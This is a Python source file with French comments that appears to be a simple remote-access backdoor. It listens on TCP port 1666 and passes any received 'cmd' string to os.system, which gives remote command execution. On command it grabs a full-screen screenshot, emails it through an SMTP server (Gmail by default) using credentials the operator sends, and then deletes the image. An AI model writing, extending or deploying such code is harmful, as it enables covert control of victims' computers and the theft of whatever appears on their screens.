import socket
import os, sys

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from PIL import ImageGrab

mail = ""
mailpw = ""
smtpadr = "smtp.gmail.com"
smtpport = 587

def rcv():
	try:
		print(mail, mailpw, smtpadr, smtpport) 
		msg = MIMEMultipart()
		msg['From'] = mail
		msg['To'] = mail
		msg['Subject'] = "DATA RCV"
		body = "DATA RCV"
		msg.attach(MIMEText(body, 'plain'))
		filename = "scr.png"
		attachment = open("scr.png", "rb")
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)	 
		server = smtplib.SMTP(smtpadr, smtpport)
		server.starttls()
		server.login(mail, mailpw)
		text = msg.as_string()
		server.sendmail(mail, mail, text)
		server.quit()
		print("rcvdata... done !")
	except:
		print("rcvdata... error !")

def scr():
	try:
		scr = ImageGrab.grab(bbox=(0,0,1920,1080))
		scr.save("scr.png")
		print("taking scr.png... done !")
	except:
		print("scr... error !")

def cleanall():
	try:
		cleanscr()
		print("cleaning... done !")
	except:
		print("clean... error !")
		
def cleanscr():
	try:
		os.remove("scr.png")
		print("cleaning scr files... done !")
	except:
		print("pas de screenshot à nettoyer, ou fichier pas accessible.")

hote = ''
port = 1666

connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_principale.bind((hote, port))
connexion_principale.listen(5)

print("Le serveur écoute à présent sur le port {}".format(port))

connexion_avec_client, infos_connexion = connexion_principale.accept()
msg_recu = b""
i = 0 
while i < 1:
	msg_recu = connexion_avec_client.recv(1024)
# L'instruction ci-dessous peut lever une exception si le message
# Réceptionné comporte des accents
	print(msg_recu.decode())
	connexion_avec_client.send(b"ok")
	if msg_recu == b"quit":
		print("Fermeture de la connexion")
		i = i + 1
	elif msg_recu[0:3] == b"cmd":
		print(msg_recu.decode()[4:len(msg_recu)])
		os.system(msg_recu.decode()[4:len(msg_recu)])
	elif msg_recu == b"scr":
		scr()
	elif msg_recu[0:5] == b"mail ":
		mail = msg_recu.decode()[5:len(msg_recu)]
		os.system("cls")
	elif msg_recu[0:7] == b"mailpw ":
		mailpw = msg_recu.decode()[7:len(msg_recu)]
		print(mailpw)
		os.system("cls")
	elif msg_recu[0:8] == b"smtpadr ":
		smtpadr = msg_recu.decode()[8:len(msg_recu)]
		os.system("cls")
	elif msg_recu[0:9] == b"smtpport ":
		try:
			smtpport = int(msg_recu.decode()[9:len(msg_recu)])
		except:
			pass
		os.system("cls")
	elif msg_recu == b"rcv":
		rcv()
		cleanall()
	elif msg_recu == b"clean":
		cleanall()




print("Fermeture de la connexion")

connexion_avec_client.close()
connexion_principale.close()